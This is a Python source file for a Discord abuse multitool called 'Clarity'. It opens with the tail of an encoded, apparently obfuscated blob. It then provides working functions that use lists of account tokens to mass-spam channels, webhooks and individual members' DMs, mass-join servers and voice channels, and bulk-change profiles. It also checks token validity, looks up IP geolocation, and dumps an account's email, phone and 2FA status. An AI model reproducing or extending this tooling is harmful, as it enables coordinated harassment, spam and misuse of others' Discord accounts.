CsjA51RX4/PecZB0UtM8hWhegJZ3g+FrzbVgjANAW3kBv3J9E/f/9797v/qcb1XyMrKi6nYs7bTbom0Ydgz24aaZiVBG4Mz8IRQgFpSczlNwJe'))
print("made by @Z0RV3Xᴰᴱ")
time.sleep(0.4)
clear_screen()
def Member_Spammer(session,token,member_id,message, times):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token,
    }
    grab_channel_payload = {
        'recipients': [
            member_id,
        ],
    }
    while True:
        try:
            grab_channel = session.post('https://discord.com/api/v9/users/@me/channels', json=grab_channel_payload)
            break
        except:
            continue
    if grab_channel.status_code == 200:
        channel_id = grab_channel.json()['id']
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({blue}/{gray}) {blue}Grabbed Channel Id{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{channel_id}\n", Colors.green_to_blue, interval=0.000)
            Member_Spammer_title() 
        paylaod = {
            'content':message
        }
        for _ in range(int(times)):
            while True:
                try:
                    spam = session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json=paylaod)
                    break
                except:
                    continue
            if spam.status_code == 200:
                with output_lock:
                    Message_send +=1
                    time_rn = get_time()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Message Send To{gray} | ", end="")
                    sys.stdout.flush()
                    Write.Print(f"{member_id}\n", Colors.green_to_blue, interval=0.000)
                    Member_Spammer_title() 
            else:
                with output_lock:
                    time_rn = get_time()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Could't Send Message To{gray} | ", end="")
                    sys.stdout.flush()
                    Write.Print(f"{member_id}\n", Colors.green_to_blue, interval=0.000)
                    Member_Spammer_title() 
print(f"""                     
                       {black}                      ..+**#+...                       
                               .::=*%@@*:....=###+@@@%*.  ..:+%@#+-::.       
                               .:@@@@@@@@#..-=*=##@@@*.    *@@@@@@@@-        
                               .#@@#=#%%+.   .+**#@@@@:   ..+%@#=#@@%.       
                               -@@@=.         ..-%@@@@*.    ..  .=@@@-       
                               -@@@%:         .-%@@@@@@.        .#@@@-       
                               -@@@@@*:.      :@@@@@@@@:     .:+@@@@@-       
                               -@@@@@@@@%#+-..#@@@@@@@@-.:=*#@@@@@@@@-       
                               -@@*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*@@-{red}       
                               -@@*%@:@@@@@@@@@@@@@@@@@@@@@@@@@:@@*@@-       
                               -@@*%@:@%+@%+@@#@@@@@@@#@@+%@+#@:@@*@@-       
                               -@@*%@:@%+@%+@@=@@@@@@@+%@+%@+#@:@@*@@-       
                               -@@*%@:@%+@%+@@:@@@@@@@-%@+%@+#@:@@*@@-       
                               -@@*%@:@%+@%+@@.%@@@@@%.%@+%@+#@:@@*@@-       
                               -@@*%@:@%+@%+@@.+@@@@@*.%@+%@+#@:@@*@@-       
                               -@@*%@:@%+@%+@@.=@@@@@=.%@+%@+#@:@@*@@-       
                               -@@+%@:@%+@%+*:%@@@@@@@%:*+%@+#@:@@*@@-       
                               -@@+%@:@%+@*:+@@@@@@@@@@@+:*@+#@:@@*@@-{yellow}       
                               -@@+%@:@#:.-%%@@@@@@@@@@@%%-.:#@:@@*@@-       
                               -@@+%@:-...+##@@+@@@@@+%@##+...-:@@*@@-       
                               -@@+#*##+-##::*.-@@@@@=.*::##-+##*#*@@-       
                               -@*..=.-*####+-.+@@@@@+.-+####*-.+..*@-       
                               ..  .+##-+#.:*=.#@@@@@%.=*:.#+-##*.  ..       
                                  ..-=..=#=...+@@@@@@@+...=#+..--.           
                                       ..++*%@@@@@@@@@@@#+++....             
                                          ..:--:-%@%-:==:.. . ..             
                                                 .-..   {reset}      

                                      Wir knien allein vor Gotte 
                                          made by @Z0RV3Xᴰᴱ
                        
""")
time.sleep(2)
clear_screen()
def Clarity():
    global Joined,Token_checked,valid_tokens,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    with open('config.json','r') as d:
        data = json.load(d)
        threads_num = data['threads']
    Write.Print(f'''
                                                                                   ║ user: {username}
                                                                                   ║═══════════════
                         ▄████▄   ██▓    ▄▄▄       ██▀███   ██▓▄▄▄█████▓▓██   ██▓  ║ Tokens > {lol}
                        ▒██▀ ▀█  ▓██▒   ▒████▄    ▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒ ▒██  ██▒  ║ Proxies > {proxies}
                        ▒▓█    ▄ ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░  ▒██ ██░  ║═══════════════
                        ▒▓▓▄ ▄██▒▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  ░██░░ ▓██▓ ░   ░ ▐██▓░  ║ Telegram:
                        ▒ ▓███▀ ░░██████▒▓█   ▓██▒░██▓ ▒██▒░██░  ▒██▒ ░   ░ ██▒▓░  ║ T.me/Z0RV3X
                        ░ ░▒ ▒  ░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓    ▒ ░░      ██▒▒▒   ╚═══════════════
                          ░  ▒   ░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░    ░     ▓██ ░▒░
                        ░          ░ ░    ░   ▒     ░░   ░  ▒ ░  ░       ▒ ▒ ░░ 
                        ░ ░          ░  ░     ░  ░   ░      ░            ░ ░ 


                                       by ~Z0RV3Xᴰᴱ~ | https://github.com/Z0RV3X
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════                  
        [01] Server Spammer          [04] Webhook Deleter        [07] Nickname/Bio Changer        [10] IP info           
        [02] Server Joiner           [05] Webhook Spammer        [08] Member Spammer              [11] Token Info    
        [03] Token Checker           [06] VC joiner              [09] Pfp Changer  
                   '''                                    
    , Colors.cyan_to_blue, interval=0.0001)
    choice = input(f""" {blue}
┌──({green}Clarity@skid{magenta}) ~ [{yellow}Ϟ{magenta}]
└─>{blue} """)
    threads = []
    session = check_useproxies()
    if choice == '01' or choice == '1':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        choosee = input(f'{magenta}[{blue}?{magenta}] Spam One Channel(1) / Spam Many Channels (2) (1,2)>>{blue} ')
        if choosee == '1':
            channel = input(f'{magenta}[{blue}?{magenta}] Channel id (tokens must be in server) >>{blue} ')
            message = input(f'{magenta}[{blue}?{magenta}] Message >>{blue} ')
            howmany = input(f'{magenta}[{blue}?{magenta}] How many times >>{blue} ')
            with open(file,'r') as t:
                tokens = t.read().splitlines()
            print('\n')
            for token in tokens:
                t = threading.Thread(target=Server_Spammer, args=(session,token,channel,message,howmany))
                t.start()
                threads.append(t)
            update_title_threads = threading.Thread(target=Server_Spammer_title)
            update_title_threads.start()
            threads.append(update_title_threads)
            for thread in threads:
                thread.join()
        elif choosee == '2':
            input(f'{reset}Pls put all channels id in "channels_ids.txt" file and reopen the tool if you did it Enter to continue!')
            message = input(f'{magenta}[{blue}?{magenta}] Message you want to spam >>{blue} ')
            howmany = input(f'{magenta}[{blue}?{magenta}] How many times each token >>{blue} ')
            with open(file,'r') as t:
                tokens = t.read().splitlines()
            with open('channels_ids.txt','r') as c:
                channels = c.read().splitlines()
            print('\n')
            for channel in channels:
                for token in tokens:
                    t = threading.Thread(target=Server_Spammer, args=(session,token,channel,message,howmany))
                    t.start()
                    threads.append(t)
                update_title_threads = threading.Thread(target=Server_Spammer_title)
                update_title_threads.start()
                threads.append(update_title_threads)
                for thread in threads:
                    thread.join()
        print('\n')
        print(f'{magenta}[{blue}!{magenta}] {green} Finished!{reset}{blue} Send: {yellow}{Message_send} Messages')
        input(f'{reset}Enter to go back...')
        clear_screen()
        Write.Print('.',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '02' or choice == '2':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        invite = input(f'{magenta}[{blue}?{magenta}] Invite Code >> https://discord.gg/{blue}')
        with open(file,'r') as t:
            tokens = t.read().splitlines()
        start_time1 = time.time()
        print('\n')
        for token in tokens:
            t = threading.Thread(target=Server_Joiner, args=(session,token,invite))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Server_Joiner_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        current_time = time.time()
        elapsed_time = current_time - start_time1
        elapsed_hours = int((elapsed_time % 86400) // 3600)
        elapsed_minutes = int((elapsed_time % 3600) // 60)
        elapsed_seconds = int(elapsed_time % 60)
        print('\n')
        print(f'{magenta}[{blue}!{magenta}] {green} Finished!{reset}{blue} Joined: {yellow}{Joined} Tokens {blue}To {magenta}https://discord.gg/{invite} In {green}{magenta}{elapsed_hours}h {elapsed_minutes}m {elapsed_seconds}s {reset}')
        input('Enter to go back...')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '03' or choice == '3':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [default tokens.txt] >>{blue} ')
        try:
            os.mkdir('Tokens_Data') 
        except:
            pass
        with open(file,'r') as t:
            tokens = t.read().splitlines()
        print('\n')
        for token in tokens:
            time.sleep(0.15)
            t = threading.Thread(target=Token_Checker, args=(session,token))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Token_Checker_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        print('\n')
        Write.Print('[!] Calculating Stats...', Colors.green_to_blue, interval=0.002)
        invalid_tokens = Token_checked-valid_tokens
        print(f'''                  
{gray}╔════════════════════════════╗
{gray}║     {yellow}Token Checker Stats{reset}  {gray}  ║
{gray}╔════════════════════════════╗
{gray}      {pink}Total Checked {magenta}  >> {pink}{Token_checked}{reset}   
{gray}      {pink}Valid Tokens {magenta}   >> {green}{valid_tokens}{reset}     
{gray}      {pink}Verified Tokens {magenta}>> {blue}{verified_tokens}{reset} 
{gray}      {pink}Nitro Tokens {magenta}   >> {yellow}{Tokens_withnitro}{reset} 
{gray}      {pink}Invalid Tokens {magenta} >> {magenta}{invalid_tokens}{reset} 
{gray}╚════════════════════════════╝    {reset}   
''')
        Write.Print('[!] Saved The Data In "Tokens_Data" Folder!\n', Colors.green_to_blue, interval=0.009)
        input('Enter to go back...')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '04' or choice == '4':
        webhook = input(f'{magenta}[{blue}?{magenta}] webhook >{blue} ')
        response = None 
        try:
            response = requests.delete(webhook)
            if response.status_code == 204:
                print("Webhook deleted successfully.")
            else:
                print(f"Failed to delete the webhook. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
        except Exception as e:
            print(f'Error occurred while deleting webhook: {e}')
        input('\nEnter to go back...')
        clear_screen()
        Write.Print('. ', Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '05' or choice == '5':
        webhook = input(f'{magenta}[{blue}?{magenta}] Webhook >>{blue} ')
        message = input(f'{magenta}[{blue}?{magenta}] Message >>{blue} ')
        howmany = input(f'{magenta}[{blue}?{magenta}] How many times >>{blue} ')
        print('\n')
        for _ in range(threads_num):
            t = threading.Thread(target=Webhook_Spammer, args=(session,webhook,message,howmany))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Token_Checker_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
    if choice == '06' or choice == '6':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        server_id = input(f'{magenta}[{blue}?{magenta}] Server_Id >>{blue} ')
        channel_id = input(f'{magenta}[{blue}?{magenta}] Voice_Channel_Id >>{blue} ')
        mute = input(f'{magenta}[{blue}?{magenta}] Mute (y,n) >>{blue} ')
        deaf = input(f'{magenta}[{blue}?{magenta}] Deaf (y,n) >>{blue} ')
        stream = input(f'{magenta}[{blue}?{magenta}] Stream (y,n) >>{blue} ')
        video = input(f'{magenta}[{blue}?{magenta}] Video (y,n) >>{blue} ')
        if mute == 'y' or mute == 'yes':
            mute = True
        else:
            mute == False
        if deaf == 'y' or deaf == 'yes':
            deaf = True
        else:
            deaf == False
        if stream == 'y' or stream == 'yes':
            stream = True
        else:
            stream == False
        if video == 'y' or video == 'yes':
            video = True
        else:
            video == False
        with open(file,'r') as t:
            tokens = t.read().splitlines()
        print('\n')
        for token in tokens:
            t = threading.Thread(target=VC_joiner, args=(token,server_id,channel_id,mute,deaf,stream,video))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=VC_joiner_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        Write.Print(f'\n [!] Finished! {vc_joined} Tokens Joined Vc!', Colors.green_to_blue, interval=0.009)
        input(f'{reset}\n Enter to go back!')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '07' or choice == '7':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        nickname = input(f'{magenta}[{blue}?{magenta}] Nickname >>{blue} ')
        bio = input(f'{magenta}[{blue}?{magenta}] Bio >>{blue} ')
        with open(file,'r') as t:
            tokens = t.read().splitlines()
        print('\n')
        for token in tokens:
            t = threading.Thread(target=Nickname__bio_Changer, args=(session,token,nickname,bio))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Nickname__bio_Changer_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        Write.Print(f'\n [!] Finished! Changed : {nickname_changed} Nicknames | Changed : {bio_changed} Bios!', Colors.green_to_blue, interval=0.009)
        input(f'{reset}\n Enter to go back!')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '08' or choice == '8':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        member_id = input(f'{magenta}[{blue}?{magenta}] Member Id you want to spam >>{blue} ')
        message = input(f'{magenta}[{blue}?{magenta}] Spam Message >>{blue} ')
        howmany = input(f'{magenta}[{blue}?{magenta}] How many messages [every token] >>{blue} ')
        with open(file,'r') as t:
            tokens = t.read().splitlines()
        for token in tokens:
            t = threading.Thread(target=Member_Spammer, args=(session,token,member_id,message,howmany))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Member_Spammer_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        Write.Print(f'\n [!] Finished! Send : {Message_send} To {member_id}', Colors.green_to_blue, interval=0.009)
        input(f'{reset}\n Enter to go back!')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()

    if choice == '09' or choice == '9':
        file = input(f'{magenta}[{blue}?{magenta}] Tokens File [tokens.txt] >>{blue} ')
        image_file = input(f'{magenta}[{blue}?{magenta}] Image File >>{blue} ')
        with open('tokens.txt','r') as t:
            tokens = t.read().splitlines()
        with open(image_file, 'rb') as i:
            image_data = i.read()
        encoded_image = base64.b64encode(image_data)
        print('\n')
        for token in tokens:
            t = threading.Thread(target=Pfp_Changer, args=(session, token,encoded_image))
            t.start()
            threads.append(t)
        update_title_threads = threading.Thread(target=Pfp_Changer_title)
        update_title_threads.start()
        threads.append(update_title_threads)
        for thread in threads:
            thread.join()
        Write.Print(f'\n [!] Finished! Changed Pfp To : {pfp_changed} Tokens', Colors.green_to_blue, interval=0.009)
        input(f'{reset}\n Enter to go back!')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '10':
        def get_ip_info(ip_address):
            url = f"http://ip-api.com/json/{ip_address}"
            try:
                response = requests.get(url)
                response.raise_for_status() 
                return response.json()
            except requests.RequestException as e:
                print(f"Request failed: {e}")
                return None

        def print_ip_info(ip_info):
            if ip_info:
                print(f"IP Address: {red}{ip_info.get('query')}{blue}")
                print(f"Status: {magenta}{ip_info.get('status')}{blue}")
                print(f"Country: {green}{ip_info.get('country')}{blue}")
                print(f"Country Code:{green} {ip_info.get('countryCode')}{blue}")
                print(f"Region:{green} {ip_info.get('region')}{blue}")
                print(f"Region Name:{green} {ip_info.get('regionName')}{blue}")
                print(f"City:{green} {ip_info.get('city')}{blue}")
                print(f"Zip:{red} {ip_info.get('zip')}{blue}")
                print(f"Latitude:{red} {ip_info.get('lat', 'N/A')}{blue}")
                print(f"Longitude:{red} {ip_info.get('lon', 'N/A')}{blue}")
                print(f"Timezone:{green} {ip_info.get('timezone')}{blue}")
                print(f"ISP:{yellow} {ip_info.get('isp')}{blue}")
                print(f"Org: {yellow}{ip_info.get('org')}{blue}")
                print(f"AS: {yellow}{ip_info.get('as', 'N/A')}{blue}")
                print(f"ISP Name:{yellow} {ip_info.get('isp')}{blue}")
                print(f"Company:{yellow} {ip_info.get('org')}{blue}")
                print(f"City Latitude:{red} {ip_info.get('lat', 'N/A')}°N{blue}")
                print(f"City Longitude:{red} {ip_info.get('lon', 'N/A')}°E{blue}")
            else:
                print("Could not retrieve IP information.")
        def main():
            ip_address = input("Enter IP address: ")
            ip_info = get_ip_info(ip_address)
            print("-------------------------------")
            print_ip_info(ip_info)
            print("-------------------------------")
        if __name__ == "__main__":
            main()

        input(f'{reset}\n Enter to go back!')
        clear_screen()
        Write.Print('. ',Colors.cyan_to_blue, interval=0.0001)
        time.sleep(2)
        clear_screen()
        Clarity()
    if choice == '11':
            def getheaders(token):
                return {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }

            def get_badges(flags):
                badges = ""
                badges_map = {
                    1: "Staff",
                    2: "Partner",
                    4: "Hypesquad Event",
                    8: "Green Bughunter",
                    64: "Hypesquad Bravery",
                    128: "HypeSquad Brilliance",
                    256: "HypeSquad Balance",
                    512: "Early Supporter",
                    16384: "Gold BugHunter",
                    131072: "Verified Bot Developer"
                }

                for flag, badge in badges_map.items():
                    if flags & flag:
                        badges += badge + ", "
                if not badges:
                    badges = "None"
                return badges

            def get_creation_date(user_id):
             timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
    # Updated to use timezone-aware UTC datetime
             creation_date = datetime.fromtimestamp(timestamp, timezone.utc).strftime('%d-%m-%Y %H:%M:%S UTC')
             return creation_date

            def info():
                token = input("Enter your Discord token: ")
                user_response = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    
                if user_response.status_code == 200:
                    user_data = user_response.json()

                    badges = get_badges(user_data['flags'])
                    username = user_data['username'] + '#' + user_data['discriminator']
                    user_id = user_data['id']
                    phone = user_data['phone']
                    email = user_data['email']
                    language = user_data['locale']
                    mfa_enabled = user_data['mfa_enabled']
                    avatar_id = user_data['avatar']
                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.webp'
                    creation_date = get_creation_date(user_id)

                    print(f'''
                        {Fore.RESET}{Fore.GREEN}####### Account Info #######{Fore.RESET}
                        {magenta}[{blue}username{magenta}]{blue}        {username} | {user_id}
                        {magenta}[{blue}Badges{magenta}]{blue}          {badges}
                        {magenta}[{blue}Language{magenta}] {blue}       {language}
                        {magenta}[{blue}Created at{magenta}] {blue}     {creation_date}
                        {magenta}[{blue}Avatar URL{magenta}]{blue}      {avatar_url if avatar_id else ""}
                        {magenta}[{blue}Account Token{magenta}]{blue}   {Fore.RED}{token}{Fore.RESET}
                        {Fore.RESET}{Fore.GREEN}####### Security Info #######{Fore.RESET}
                        {magenta}[{blue}Email{magenta}]{blue}           {email}
                        {magenta}[{blue}Phone Number{magenta}]  {blue}  {phone if phone else ""}
                        {magenta}[{blue}2 Factor{magenta}]  {blue}      {mfa_enabled}
                            ''')
                else:
                    print(f'Failed to retrieve account info. Error {user_response.status_code}.')

            info()

    # Return to the Clear Screen after info retrieval
            input(f'{reset}\nEnter to go back!')
            clear_screen()
            Write.Print('. ', Colors.cyan_to_blue, interval=0.0001)
            time.sleep(2)
            clear_screen()
            Clarity()
        

    else:
        clear_screen()
        print(f'{cyan}[{magenta}!{cyan}]{magenta} Not a choice', end=' ')
        [print(f'{green}.', end='', flush=True) or time.sleep(0.7) for _ in range(3)]
        clear_screen()
        Clarity()

if __name__ == '__main__':
    Clarity()
